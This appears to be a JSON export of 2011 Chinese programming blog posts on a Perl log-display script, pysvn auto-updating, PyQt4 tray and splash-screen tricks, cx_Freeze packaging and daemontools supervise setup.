    "content": "<p>展示效果类似于dstat（python）将日志文件的结果格式化显示到终端界面</p>\n\n<p><pre class=\"sh_perl\">\n#!/usr/bin/perl -w</p>\n\n<p>use strict;\nno strict 'refs';\nuse Getopt::Long;\nuse Pod::Usage;\nuse Term::ReadKey;\nuse Time::HiRes qw ( time alarm sleep );\nGetopt::Long::Configure('bundling');</p>\n\n<p>#####初始化变量######\nmy @ltime=localtime();\nmy $date=sprintf(\"%d-%d-%d\",$ltime[5]+1900,$ltime[4]+1,$ltime[3]);\nmy $cfgfile='/cepdata/conf/cepstat.cfg';</p>\n\n<p>###获取配置文件内容###\nmy %config;\nget_config();\nmy $LogPath=$config{main}-&gt;{logpath};</p>\n\n<p>###参数选项####\nmy @opt_spec=(\n\t{ s =&gt; 'h', d =&gt; 'display help message'},\n\t{ s =&gt; 't', d =&gt; 'display system time'},\n);</p>\n\n<p>foreach my $page (keys %{$config{pagelist}}) {\n\tmy $href = { s=&gt;$config{pagelist}{$page}-&gt;{argc},d=&gt;$config{pagelist}{$page}-&gt;{desc} || $page };  # { s =&gt; 'm', d =&gt; 'some description'  }\n\tpush @opt_spec,$href;\n}\n###获取命令行参数###\nmy %opts;\npod2usage(-verbose =&gt; 1,-message =&gt; \"Need at least one argument\\ntry -h for more information\") unless @ARGV;\nGetOptions(\n\tmap { $_-&gt;{s} =&gt; \\$opts{$_-&gt;{s}} } @opt_spec  # { 'm' =&gt; \\$opts{m} }\n) or pod2usage(1);</p>\n\n<p>###要输出的日志###\nmy %pagelist;\nmap {$pagelist{$config{pagelist}-&gt;{$_}-&gt;{argc}} = $_ if $opts{$config{pagelist}-&gt;{$_}-&gt;{argc}} } keys %{$config{pagelist}} ;  # m =&gt; sumtime</p>\n\n<p>### HELP MESSAGE ###\nif ($opts{h}) {\n    foreach my $spec (sort {$a-&gt;{s} cmp $b-&gt;{s}}  @opt_spec) {\n        printf \"  -%-4s %-15s\\n\",$spec-&gt;{s},$spec-&gt;{d};\n    }\n    exit 1;\n}</p>\n\n<p>###打开文件句柄####\nmy $lastmtime='0';\nforeach my $fh (values %pagelist) {   # m =&gt; sumtime\n\t\tmy $logfile;\n\t\tif ($config{pagelist}-&gt;{$fh}-&gt;{logfile} =~ /^\\//) {\n\t\t\t$logfile=\"$config{pagelist}-&gt;{$fh}-&gt;{logfile}.$date\";\n\t\t} else {\n\t\t\t$logfile=\"$LogPath/$config{pagelist}-&gt;{$fh}-&gt;{logfile}.$date\";\n\t\t}\n\t\tmy $logmtime=(stat($logfile))[9];\n\t\t$lastmtime = $logmtime if ( $logmtime &gt; $lastmtime );\n\t\topen $fh,\"$logfile\" or die \"cant open $logfile:$!\";\n\t\tseek $fh,0,2;\n}\nmy $currenttime=time();\nmy $sleep = $lastmtime + 5.5 - $currenttime;</p>\n\n<p>#######标题与结果的格式化处理########\n\tmy $resultformat;\t\t\t\t\t#结果输出格式\n\tmy $fieldformat;\t\t\t\t\t#列名输出格式\n\tmy $pagenameformat;\t\t\t\t\t#日志名居中显示\n\tmy $tmp_regex;                      #临时正则\n\tmy @FIELDS;\t\t\t\t\t\t\t#存放所有列名的全局数组\n\tmy %FieldCount;\n\t#循环开始\n\tforeach my $page (values %pagelist) {\t\t\t\t\t\t\t\t\t\t\t #对每个日志做处理\n#\t\tmy $fields = $config{pagelist}-&gt;{$page}-&gt;{fields};                           #取出列名\n\t\tmy $alias = $config{pagelist}-&gt;{$page}-&gt;{alias};\n#\t\tmy @Fieldname = split /\\s+/,$fields;\t\t\t\t\t\t\t\t\t\t #将列名存入临时数组\n\t\tmy @Alias = split /\\s+/,$alias;\n\t\tmy $count = @Alias;\t\t\t\t\t\t\t\t\t\t\t\t\t\t #列名个数\n\t\t$FieldCount{$page}=$count;\n\t\tmy $num = $count;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t #用来计算数组下标\n\t\twhile ($count) {\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t #遍历每个列名\n#\t\t\t$tmp_regex .= $Fieldname[$num -$count] . '=' . '([\\w\\.]+),.*?';\t\t\t #拼接正则表达式\n\t\t\t$tmp_regex .= '=' . '([\\w\\.]+),.*?';\t\t\t\t\t\t\t\t\t #拼接正则表达式\n\t\t\tpush @FIELDS,$Alias[$num -$count];\t\t\t\t\t\t\t\t\t\t #将列名存入全局数组\n\t\t\t$count--;\n        }\n\t\t$tmp_regex =~ s/,\\.\\*\\?$/.*?/;\t\t\t\t\t\t\t\t\t\t\t\t #去掉临时正则后多余的字符\n\t#####页面名居中显示######\n\t\tmy $tmp_pagename = $config{pagelist}-&gt;{$page}-&gt;{format};\t\t\t\t\t #从配置文件中取出格式\n\t# g%7d y%7d p%7d c%10d\n\t\t$tmp_pagename =~ s/\\.\\d*//g;\t\t\t#去掉浮点数 1.23f -&gt; 1f\n\t\t$tmp_pagename =~ s/\\s/ 1 /g;\t\t\t#空格需要占1个字符\n\t\t$tmp_pagename =~ s/[^\\d\\s]//g;\t\t\t#去掉非数字非空格 如: 7 1 7 1 7 1 10\n\t\tmy @tmp=split /\\s+/,$tmp_pagename;\n\t\tmy $cnt;\n\t\tmy $desc = $config{pagelist}-&gt;{$page}-&gt;{desc};\n\t\tmap { $cnt += $_ } @tmp;\t\t\t\t#得出共占多少字符\n\t\tmy $pagenameleft = sprintf \"%d\",($cnt - length($desc))/ 2;\t\t\t#计算页面名前后有多少字符\n\t\tmy $pagenameright = $cnt - length($desc) - $pagenameleft;\n\t\tmy $tt = '-' x $pagenameleft . $desc . '-' x $pagenameright . ' ';  #定好格式\n\t\t$pagenameformat .= $tt;\t\t\t\t\t#将每个页面临时格式拼接起来</p>\n\n<p>\t\t$resultformat .= $config{pagelist}-&gt;{$page}-&gt;{format} . '|';                           #拼接结果输出格式\n\t}\n\t#循环结束</p>\n\n<p>\tmy $regex = qr/$tmp_regex/;                                     #构建正则表达式，存入变量中\n\t#页面名头尾加颜色代码\n\t$pagenameformat = '---sys--' . ' ' . $pagenameformat if ($opts{t});\n\t$pagenameformat =~ s/^/\\e[0;34m/;\n\t$pagenameformat =~ s/$/\\e[0m/;</p>\n\n<p>\t#每个列名后加颜色代码\n\t$resultformat =~ s/\\|$//;\t\t\t\t\t\t\t\t\t\t#去掉结果输出格式最后的分割线 |\n    $fieldformat = $resultformat;                                   #列名的输出格式               g%7d y%7d p%7d c%10d|r%10s y%7s\n    $fieldformat =~ s/\\.\\d+f|d/s/g;                                 #列名都为字符串，将d,f转成s   g%7s y%7s p%7s c%10s|r%10s y%7s\n\t$fieldformat =~ s/\\w?(?=%)/\\e[1;4;34m/g;\n\t$fieldformat =~ s/(?=\\s|$)/\\e[0m/g;\t\t\t\t\t\t\t\t#转为\\e[1;4;34m%7s\\e[0m ..... 高亮下划线蓝色\n\t$fieldformat =~ s/(?=\\|)/\\e[0;34m/g;\t\t\t\t\t\t\t# | 为普通蓝色</p>\n\n<p>\t#结果格式预处理\n\t$resultformat =~ s/(?=\\s|$)/\\e[0m/g;\t\t\t\t\t\t\t#转为 g%7d\\e[0m y%7d\\e[0m\n\t$resultformat =~ s/(?=\\|)/\\e[0;34m/g;\t\t\t\t\t\t\t# | 为普通蓝色\n\tmy @MasterColor;\t\t\t\t\t\t\t\t\t\t\t\t#默认颜色的数组\n\tpush @MasterColor,$1 while ($resultformat =~ s/(\\w)%/!%/);\t\t#格式转为 !%7d\\e[0m !%7d\\e[0m  数组内容 (g y p c r y)</p>\n\n<p>\tmy $lines_left;\t\t\t\t\t\t\t\t\t\t\t\t#终端所剩行数\n\tmy @OldData=();\t\t\t\t\t\t\t\t\t\t\t\t#日志最后一行匹配出的结果，用来与新数据比较\n\tmy @NewData;\n######主循环######\nprint \"Waiting for new data......\\n\";\nsleep $sleep if ($sleep &gt; 0);\nwhile (1) {\n\t\tmy $logline;\n\t\tPrintTitle() unless $lines_left;\t\t\t\t\t#打印标题栏\n\t\tforeach my $page (values %pagelist) {\t\t\t\t#从每个日志文件读入一行\n\t\t\tif (my $line = &lt;$page&gt;) {\n\t\t\tchomp($line);\n\t\t\t$logline .= $line . \" \";\t\t\t\t\t\t#所有行拼接起来\n\t\t\t} else {\n\t\t\t\t\tmy $count = $FieldCount{$page};\n\t\t\t\t\t$logline .= '=0,' while ($count--);\n\t\t\t\t\t$logline =~ s/,$/ /;\n\t\t\t\t}\n\t\t\t}\n\t\tif (@NewData = $logline =~ $regex) {\t\t\t\t\t\t#匹配出新数据\n\t\t\t@OldData = @NewData unless @OldData;\n\t\t\tCheckThreshold();\t\t\t\t\t\t\t\t#与旧数据比较并打印\n\t\t\t$lines_left--;\t\t\t\t\t\t\t\t\t#所剩行数 -1\n\t\t}\n\t\tsleep 5;\n}</p>\n\n<p>sub PrintTitle{\n    $lines_left = (GetTerminalSize())[1] ;                              #获取行数\n\tprint \"$pagenameformat\\n\";\n\tprint \"\\e[1;4;34m  time  \\e[0;34m|\" if $opts{t};\n\tprintf \"$fieldformat\\n\",@FIELDS;\n\t$lines_left -= 3;\n}</p>\n\n<p>sub get_config\n{\n    open CEPCONF,\"&lt;$cfgfile\" or die \"can't open configfile!\"; #打开配置文件\n    while (&lt;CEPCONF&gt;) {\n        next if /^$/;           #忽略空行\n        next if /^\\s*\\#/;       #忽略注释\n        if (my ($menu) = /\\[(\\w+)\\]/) {     #遇到[a]\n                while (&lt;CEPCONF&gt;) {         #循环读取[a]下的内容\n                    next if /^$/;\n                    next if /^\\s*\\#/;\n                    last if /\\[\\/(\\w+)\\]/;  #如果遇到[/a]结束此循环\n                    chomp;\n                    if (my ($pagename) = /\\[(\\w+)\\]/) { #又遇到[b]\n                        while (&lt;CEPCONF&gt;) {             #循环读取[]下的内容\n                        next if /^$/;\n                        next if /^\\s*\\#/;\n                        last if /\\[\\/(\\w+)\\]/;          #如果遇到[/b]结束此循环\n                        chomp;\n                        my ($cfg_key,$cfg_value)= split /=/;    #获取以=分隔的变量名，变量值\n                        $cfg_key =~ s/^\\s+|\\s+$//g;             #去掉变量名前后的空白字符\n                        $cfg_value =~ s/\\#.*$//g;               #去掉变量值后的注释\n                        $cfg_value =~ s/^\\s+|\\s+$//g;           #去掉变量值前后的空白字符\n                        $cfg_value =~ s/['\"]//g;                #去掉变量值前后的引号\n                        $config{$menu}-&gt;{$pagename}-&gt;{$cfg_key}=$cfg_value;     #将变量名、变量值存入hash $config{a}-&gt;{b}-&gt;{变量名}=变量值\n                            }\n                        }\n                    next if /\\[\\/(\\w+)\\]/;              #遇到[/b]跳过\n                    my ($cfg_key,$cfg_value)= split /=/;        #获取以=分隔的变量名，变量值\n                $cfg_key =~ s/^\\s+|\\s+$//g;                 #同上\n            $cfg_value =~ s/\\#.*$//g;\n        $cfg_value =~ s/^\\s+|\\s+$//g;\n        $cfg_value =~ s/['\"]//g;                    #去掉变量值前后的引号\n    $config{$menu}-&gt;{$cfg_key} = $cfg_value;    #存入hash $config{a}-&gt;{变量名}=变量值\n            }\n        }\n    }\n    close CEPCONF;      #关闭文件句柄\n}           </p>\n\n<p>sub CheckThreshold{</p>\n\n<p>\tmy $threadformat=$resultformat;\t\t\t\t\t\t#格式 !%7d\\e[0m !%7d\\e[0m\n\tmy $numrel=@NewData;\n\tmy $cnt=$numrel;\t\t\t\t\t\t\t\t\t\t\t#用来计算下标\n\tmy @format;\n\twhile ($cnt) {\n\t\tmy $xiabiao=$numrel-$cnt;\n\t\t$NewData[$xiabiao] =~ s/null/0/;\n\t\tif ($NewData[$xiabiao] =~ /[a-z\\.]+/) {\t\t\t\t#非数字不比较，直接更新到旧数据数组\n\t\t\t$format[$xiabiao]=$MasterColor[$xiabiao];\t#取默认颜色\n\t\t\t$cnt--;\n\t\t\tnext;\n\t\t} elsif  ($NewData[$xiabiao] == 0 ) {\t\t\t#值为0,转变为白色\n\t\t\t$format[$xiabiao]='w';\n\t\t\t$cnt--;\n\t\t\tnext;\n\t\t\t}\n\t\tif ( abs($NewData[$xiabiao]  - $OldData[$xiabiao] + 0) /($OldData[$xiabiao] + 1 ) &gt; 0.5 ) {\n\t\t\t$format[$xiabiao]='z';\t\t\t\t\t\t#新数据变化率超过阀值，转变为高亮红色，不更新到旧数据数据\n        } else {\n\t\t\t$format[$xiabiao]=$MasterColor[$xiabiao];\t#未超过阀值,取默认颜色\n\t\t\t$OldData[$xiabiao]=$NewData[$xiabiao];\t\t#更新到旧数据数组\n\t\t}\n\t\t$cnt--;\n\t}</p>\n\n<p>\tmap { $threadformat =~ s/!/$_/} @format;\t\t\t#g%7d\\e[0m y%7d\\e[0m ....</p>\n\n<p>\t$threadformat =~ s/z/\\e[1;31m/g;\n#\t$threadformat =~ s/r/\\e[0;31m/g;\n\t$threadformat =~ s/g/\\e[1;32m/g;\n\t$threadformat =~ s/y/\\e[1;33m/g;\n\t$threadformat =~ s/b/\\e[0;34m/g;\n\t$threadformat =~ s/p/\\e[1;35m/g;\n\t$threadformat =~ s/c/\\e[1;36m/g;\n\t$threadformat =~ s/w/\\e[0;37m/g;</p>\n\n<p>\tif ($opts{t}) {\n\t\tmy @localtime=localtime;\n\t\tmy $time=sprintf(\"%02d:%02d:%02d\",$localtime[2],$localtime[1],$localtime[0]);\n\t\tprint \"\\e[0;37m$time\\e[0;34m|\";\n\t\t}</p>\n\n<p>\tprintf \"$threadformat\\n\",@NewData;\n}\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "September",
      "day": "18"
    }
  },
  {
    "id": 97,
    "title": "使用svn特性使python程序自动更新",
    "category": "linux基础",
    "tags": [
      "pysvn",
      "python 程序自动更新",
      "svn自动更新"
    ],
    "url": "/archives/shiyongsvntexingshipythonchengxuzidonggengxin/",
    "content": "<p>前言：本例借用pysvn这个第三方模块实现。原理是对比某2个svn版本的不同的文件列表，根据增加，删除和修改的不同座不同的操作，达到程序的自动更新</p>\n\n<p><pre class=\"sh_python\">\nclass Svnup:\n    def __init__(self,minv,maxv):\n        import pysvn\n        import getopt, sys, time, string\n        import os, urllib\n        from urlparse import urlparse\n        client = pysvn.Client()\n        revision_min = pysvn.Revision( pysvn.opt_revision_kind.number,minv)\n        revision_max = pysvn.Revision( pysvn.opt_revision_kind.number,maxv)\n        urlObject = urlparse('http://172.16.180.129/project/svnup')\n        url = urlObject.scheme+\"://\"+urlObject.netloc+urllib.quote(urlObject.path.decode(sys.stdin.encoding).encode('utf8'))\n    def get_login(self,realm, user, may_save ):\n        return True,'dongwm','password', False\n    def run(self):\n        client.callback_get_login = get_login\n        summary = client.diff_summarize(url, revision_min, url, revision_max)\n        for changed in summary:\n            print changed['summarize_kind']\n            if pysvn.diff_summarize_kind.delete == changed['summarize_kind']:\n              fullPath = \"../\"+changed['path']\n              if os.path.exists(fullPath):\n                os.remove(fullPath)</p>\n\n<p>            if pysvn.diff_summarize_kind.added == changed['summarize_kind'] or pysvn.diff_summarize_kind.modified == changed['summarize_kind']:\n                print changed['summarize_kind'], changed['path']\n                if changed['node_kind'] == pysvn.node_kind.file:\n                    file_text = client.cat(url+urllib.quote(changed['path'].encode('utf8')), revision_max)\n                    fullPath = \"../\"+changed['path']\n                    dirPath = fullPath[0:fullPath.rfind(\"/\")]\n                    if not os.path.exists(dirPath):\n                        os.makedirs(dirPath)\n                    f = open(fullPath,'wb')\n                    f.write(file_text)\n                    f.close\nsvnup =Svnup(svn-min,svn-max)\nsvnup.run()\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "October",
      "day": "23"
    }
  },
  {
    "id": 98,
    "title": "python程序（本例pyqt4图形程序）中点击自动弹出QQ聊天窗口",
    "category": "python",
    "tags": [
      "pyqt4",
      "python 打开QQ对话框",
      "python打开网页"
    ],
    "url": "/archives/pythonchengxubenlipyqt4tuxingchengxuzhongdianjizidongdanchuqqliaotianchuangkou/",
    "content": "<p>前言：很向往点击某网页就能弹出QQ聊天窗口，最近做的一个python程序为了方便用户提交bug，也设计了一个点击自动弹出和我QQ聊天的对话框供大家参考（只剪切了其中一部分）：</p>\n\n<p><pre class=\"sh_python\"></p>\n\n<p>from PyQt4 import QtCore, QtGui\nimport systray_rc\nimport threading,os\nimport re,time\ntry:\n_fromUtf8 = QtCore.QString.fromUtf8\nexcept AttributeError:\n_fromUtf8 = lambda s: s\n#设计一个界面，可以做成记事本效果，能够打印文件中的文本\nclass Ui_notepad(object):\ndef setupUi(self, notepad):\nnotepad.setObjectName(_fromUtf8(\"notepad\"))\nnotepad.setWindowTitle(QtGui.QApplication.translate(\"notepad\", \"Form\", None, QtGui.QApplication.UnicodeUTF8))\nself.editor_window = QtGui.QTextEdit(notepad)\nself.editor_window.setGeometry(QtCore.QRect(10, 50, 380, 240))\nself.editor_window.setObjectName(_fromUtf8(\"editor_window\"))</p>\n\n<p>self.retranslateUi(notepad)\nQtCore.QMetaObject.connectSlotsByName(notepad)</p>\n\n<p>def retranslateUi(self, notepad):\npass\nclass Window(QtGui.QMainWindow):\n    def __init__(self):\n       # super(Window, self).__init__()\n\tQtGui.QMainWindow.__init__(self)\n        self.iconComboBox = QtGui.QComboBox()\n        self.iconComboBox.addItem(\n            QtGui.QIcon('../image/app.jpg'), \"Dmyz\")\n\t#通知区域图标右键菜单设置,弹出的菜单的行为，包括退出，还原，最小化\n        self.minimizeAction = QtGui.QAction(u\"最小化\", self,\n                triggered=self.hide)\n        self.restoreAction = QtGui.QAction(u\"显示菜单\", self,\n                triggered=self.showNormal)\n        self.quitAction = QtGui.QAction(u\"退出\", self,\n                triggered=QtGui.qApp.quit)\n\tself.ui = Ui_notepad()\n        self.ui.setupUi(self)\n        self.trayIconMenu = QtGui.QMenu(self)\n        self.trayIconMenu.addAction(self.restoreAction)\n        self.trayIconMenu.addAction(self.minimizeAction)\n        self.trayIconMenu.addAction(self.quitAction)\n        self.trayIcon = QtGui.QSystemTrayIcon(self)\n        self.trayIcon.setContextMenu(self.trayIconMenu)\n        self.iconComboBox.currentIndexChanged.connect(\n            self.setIcon)\n        #设置第一个按键 效果退出\n        exit = QtGui.QAction(QtGui.QIcon('../image/exit.png'), 'Exit', self)\n\texit.setShortcut('Ctrl+Q')\n        exit.setStatusTip(u'\\u9000\\u51fa\\u4e3b\\u83dc\\u5355')\n        self.connect(exit, QtCore.SIGNAL('triggered()'), QtCore.SLOT('close()'))\n\t#设置第二个按键  历史记录\n        lishi = QtGui.QAction(QtGui.QIcon('../image/history.png'),u'\\u5386\\u53f2', self)\n\tlishi.setShortcut('Ctrl+L')\n        lishi.setStatusTip(u'\\u5386\\u53f2')\n        lishi.connect(lishi,QtCore.SIGNAL('triggered()'), self.file_dialog)\n\t#设置第3个按键  关于信息\n\tguangyu = QtGui.QAction(QtGui.QIcon('../image/app.jpg'),u'\\u5173\\u4e8e', self)\n\tguangyu.setShortcut('Ctrl+K')\n        guangyu.setStatusTip(u'\\u5173\\u4e8e')\n        guangyu.connect(guangyu,QtCore.SIGNAL('triggered()'), self.print_text)\n\t#设置第4个按键 bug提交 弹出QQ对话框\n\tqq = QtGui.QAction(QtGui.QIcon('../image/QQ.png'),u'BUG\\u8bf7\\u8054\\u7cfb\\u6211', self)\n\tqq.setShortcut('Ctrl+U')\n        qq.setStatusTip(u'\\u70b9\\u51fb\\u6253\\u5f00QQ')\n        qq.connect(qq,QtCore.SIGNAL('triggered()'), self.contqq)</p>\n\n<p>        self.statusBar()\n        menubar = self.menuBar()\n        file = menubar.addMenu('&amp;Exit')\n        file.addAction(exit)\n\tfile2 = menubar.addMenu('&amp;History')\n        file2.addAction(lishi)\n\tfile3 = menubar.addMenu('About')\n        file3.addAction(guangyu)\n\tfile3 = menubar.addMenu('Contact')\n        file3.addAction(qq)\n    #设置打开文件 在pyqt4的主餐单里面的记事本区域显示\n    def file_dialog(self):\n        s = open('../log/Communicate.log','r').read()\n\tif len(s) == 0:\n\t    self.atext = u'目前您还没收到什么信息哦^.^'\n\t    self.ui.editor_window.setPlainText('sdf')\n        self.ui.editor_window.setPlainText(self.atext)\n    def print_text(self):  #设置打印关于的信息\n\tself.ui.editor_window.setPlainText(self.text)\n    def contqq(self):  #设置打开QQ\n\timport win32com.client\n\tie6=win32com.client.Dispatch(\"InternetExplorer.Application\")\n\tie6.Navigate(\"tencent://message/?exe=qq&amp;menu=yes&amp;Uin=61966225\")\n\tie6.Visible=1\n\twhile ie6.Busy:\n\t  time.sleep(1)\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "October",
      "day": "24"
    }
  },
  {
    "id": 99,
    "title": "解决pyqt系统托盘右键菜单在点击其他位置不隐藏（消失）的问题",
    "category": "linux基础",
    "tags": [
      "pyqt4",
      "trayIcon",
      "系统托盘"
    ],
    "url": "/archives/jiejuepyqtxitongtuopanyoujiancaidanzaidianjiqitaweizhibuyincangxiaoshidewenti/",
    "content": "<p>前言：在使用一些软件的时候都发现当你右键点开这个软件的菜单，再点击其他位置这个菜单会隐藏起来。这样不弹出的菜单无法消失，必须点击菜单项或者应用程序窗体才会消失。。pyqt软件也有这个问题。我研究了一下：该菜单的context是默认的应用程序窗体，当窗体获得焦点时，系统托盘的上下文菜单才会消失。</p>\n\n<p>请看我的部分代码：</p>\n\n<p>self.minimizeAction = QtGui.QAction(u\"最小化\", self,\ntriggered=self.hide)   ＃这个self是继承QtGui.QMainWindow的类\nself.restoreAction = QtGui.QAction(u\"显示菜单\", self,\ntriggered=self.show)\nself.quitAction = QtGui.QAction(u\"退出\", self,\ntriggered=QtGui.qApp.quit)</p>\n\n<p>self.trayIconMenu = QtGui.QMenu(self)\nself.trayIconMenu.addAction(self.restoreAction)\nself.trayIconMenu.addAction(self.minimizeAction)\nself.trayIconMenu.addAction(self.quitAction)\n需要将“self.trayIconMenu = QtGui.QMenu(self)”这行修改为“self.trayIconMenu = QtGui.QMenu(QtGui.QApplication.desktop())”  原理是将这个菜单当作一个桌面</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "October",
      "day": "25"
    }
  },
  {
    "id": 100,
    "title": "opensuse安装kiba-dock",
    "category": "opensuse",
    "tags": [
      "kiba-dock"
    ],
    "url": "/archives/opensuseanzhuangkiba-dock/",
    "content": "<p>前言：我想很多人都用过ubuntu下的cairo-dock，那么这个kiba－dock真的有点被遗忘，今天突然没事做，回忆了一下刚开始学习ubuntu时候的感觉。</p>\n\n<p>目前opensuse新版本已经不含这个软件了。然后搜索了一下：</p>\n\n<p>wget ftp://ftp.pbone.net/mirror/ftp5.gwdg.de/pub/opensuse/repositories/home:/swyear/openSUSE_11.1/i586/kiba-dock-0.svn862-6.6.i586.rpm\nwget ftp://ftp.pbone.net/mirror/ftp5.gwdg.de/pub/opensuse/repositories/home:/swyear/openSUSE_11.1/i586/kiba-plugins-0.svn862-7.6.i586.rpm</p>\n\n<p>但是发现：需要一个比较老的libcrypto.so.0.9.8和libssl.so.0.9.8，但是我的版本已经提高到1.0.0，所以安装时候忽略依赖关系\nsudo rpm -ivh kiba-plugins-0.svn862-7.6.i586.rpm kiba-dock-0.svn862-6.6.i586.rpm --nodeps</p>\n",
    "date": {
      "year": "2011",
      "month": "October",
      "day": "27"
    }
  },
  {
    "id": 101,
    "title": "使用cx_Freeze对python程序打包生成多个exe文件",
    "category": "linux基础",
    "tags": [
      "cx_Freeze",
      "python打包"
    ],
    "url": "/archives/shiyongcx_freezeduipengyoutahuanoni/",
    "content": "<p>前言：使用python程序需要打包成exe忽略python环境的可执行文件，但是网上没有出现一个相对比较好的文档，我这里有一个setup.py:</p>\n\n<p><pre class=\"sh_python\">\nfrom distutils.core import setup\nfrom cx_Freeze import setup, Executable </p>\n\n<p>GUI2Exe = Executable(\n      script = \"update.py\",  ＃对主程序相关文件升级程序\n      base = 'Win32GUI',\n       )\nGUI2Exe2 = Executable(\n      script = \"main.py\",  #主程序\n      base = 'Win32GUI',\n      icon = r\"C:\\app.ico\",  #自动exe文件的图标\n      shortcutName = u\"GY终端\",  \n       )\nincludeFiles = [\n     ( r\"C:\\dervcer\\etc\", \"../etc\"),\n     (r\"C:\\dervcer\\log\", \"../log\"),\n      (r\"C:\\dervcer\\image\", \"../image\"),\n      (r\"C:\\dervcer\\imageformats\", \"./imageformats\")\n    ]   #这个地方主要是为了在打包中添加一些源文件，生成至打包目录，其中imageformats是pyqt4里面的插件动态链接库文件目录，要不然无法在winodws下显示系统图标</p>\n\n<p>setup(\n        name = \"test\",\n        version = \"0.1\",\n        description = \"dongwm\",   ＃生成的exe文件的描述\n        options = {\"build_exe\": {\"include_files\": includeFiles,}}, </p>\n\n<p>        executables = [GUI2Exe,GUI2Exe2])   ＃因为要生成多个exe文件 所以指定了2个执行的“块”\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "October",
      "day": "28"
    }
  },
  {
    "id": 102,
    "title": "使用supervise让不稳定程序死掉自动马上重启",
    "category": "linux基础",
    "tags": [
      "runit",
      "supervise"
    ],
    "url": "/archives/shiyongsuperviserangbuwendingchengxusidiaozidongmashangzhongqi/",
    "content": "<p>前言：supervise是daemontools的一个工具，可以用来监控linux下程序的进程状态，当程序有一些问题（例如死掉）会根据设置 自动重启。我有一个socket服务器端需要一直监听数据，但是为了保证它不会莫名其妙的死掉而不可知，但是使用ICE(全称Internet Communications Engine)有点大材小用，所以使用了这个supervise自动重启死掉的程序并记录日志</p>\n\n<p><strong>1 下载安装配置：</strong></p>\n\n<p>wget http://cr.yp.to/daemontools/daemontools-0.76.tar.gz</p>\n\n<p>wget http://www.qmail.org/moni.csi.hu/pub/glibc-2.3.1/daemontools-0.76.errno.patch  ＃这个补丁是修复有些操作系统无法编译安装成功，过程中会报错停止的问题</p>\n\n<p>tar xvzf daemontools-0.76.tar.gz</p>\n\n<p>cd admin/daemontools-0.76</p>\n\n<p>patch -Np1 -i ../../daemontools-0.76.errno.patch</p>\n\n<p>package/compile</p>\n\n<p>cd package &amp;&amp;  sed 's|/command|/usr/sbin|' boot.inittab &gt; boot.inittab~</p>\n\n<p>mv -f boot.inittab~ boot.inittab &amp;&amp;  cd ../command</p>\n\n<p>sed -e 's/command:\\/usr\\/local\\/bin:/usr\\/local\\/sbin:/'  -e 's/command\\/svc/usr\\/sbin\\/svc/' svscanboot &gt; svscanboot~</p>\n\n<p>mv -f svscanboot~ svscanboot &amp;&amp; chmod +x svscanboot</p>\n\n<p>sudo /bin/cp * /usr/sbin</p>\n\n<p>添加： SV:123456:respawn:/usr/sbin/svscanboot  到  /etc/inittab</p>\n\n<p><strong>2 检查是否安装成功：</strong></p>\n\n<p># pstree -p|grep svs ＃然后有下面类似的进程结构（括号中数据会不一样）</p>\n\n<p>|-svscanboot(22011)-+-readproctitle(22014)         |</p>\n\n<p>`-svscan(22013)</p>\n\n<p><strong>3 编辑你要使用supervise的程序和配置文件</strong></p>\n\n<p>首先建立一个目录：</p>\n\n<p>mkdir /home/dongwm/SocketSrv</p>\n\n<p>然后编辑run配置文件：</p>\n\n<p>cat /home/dongwm/SocketSrv/run\n#!/bin/sh\necho 'kill Socketsrv...'\nkill -9 `ps -ef |grep Socketsrv.py |grep -v grep |awk '{print $2}'`</p>\n\n<p>echo \"`date +%Y%m%d-%H%M%S`\"\necho 'start Socketsrv...'\npython Socketsrv.py ＃这个就是你要让它关里的进程程序 就在Socketsrv目录下</p>\n\n<p><strong>4 启动进程：</strong>\n为了排错，我使用了日志记录＋日志轮转的方式（）</p>\n\n<p>nohup supervise /home/dongwm/SocketSrv |/usr/sbin/cronolog \"/var/log/Socketsrv.log_%Y%m%d\" &amp;</p>\n\n<p>表示后台运行，将输入定向到/var/log/Socketsrv.log 并且按天分日志\n<strong></strong></p>\n",
    "date": {
      "year": "2011",
      "month": "November",
      "day": "03"
    }
  },
  {
    "id": 103,
    "title": "(pyqt4)python程序启动画面淡入淡出效果",
    "category": "linux基础",
    "tags": [
      "QSplashScreen",
      "淡入淡出效果",
      "程序启动画面"
    ],
    "url": "/archives/pyqt4pythonchengxuqidonghuamiandanrudanchuxiaoguo/",
    "content": "<p>前言：见过很多软件启动程序后会有个启动画面，并且还有个淡入淡出效果。研究了很久终于实现了：</p>\n\n<p><pre class=\"sh_python\">\nclass SplashScreen(QSplashScreen):</p>\n\n<p>    def __init__(self):\n        super(SplashScreen, self).__init__(QPixmap(\"../image/app.jpg\"))   ＃启动程序的图片\n        self.setWindowModality(Qt.ApplicationModal)\n    def fadeTicker(self):\n        self.setWindowOpacity(0) \n        t =0\n        while t &lt;=50:\n            newOpacity = self.windowOpacity() + 0.02     ＃设置淡入\n            if newOpacity &gt; 1:\n           #     self.close()\n                break</p>\n\n<p>            self.setWindowOpacity(newOpacity)\n            self.show()\n            t -= 1\n            time.sleep(0.04)\n        self.show()\n        time.sleep(1)\n        t =0\n        while t &lt;=50:\n            newOpacity = self.windowOpacity() - 0.02         ＃设置淡出\n            if newOpacity &lt; 0:\n                self.close()\n                break</p>\n\n<p>            self.setWindowOpacity(newOpacity)\n            self.show()\n            t += 1\n            time.sleep(0.04)</p>\n\n<p>if __name__ == \"__main__\":\n    app = QtGui.QApplication(sys.argv)\n    splash = SplashScreen()\n    splash.fadeTicker()\n    app.processEvents()   ＃设置启动画面不影响其他效果\n    QtGui.QApplication.setQuitOnLastWindowClosed(False)          \n    window = Window(confdict)       ＃这是qt程序的主类 每个人的这个不同\n    window.st()\n    splash.finish(window)            ＃启动画面完成启动qt主类\n    sys.exit(app.exec_())\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "November",
      "day": "04"
    }
  },
  {
    "id": 104,
    "title": "linux下模拟Xshell/Scrt的自动登录多台服务器操作命令以及对linux终端的位置控制",
    "category": "expect",
    "tags": [
      "cssh",
      "linux组服务器操作",
      "linux终端命令",
      "移动linux终端"
    ],
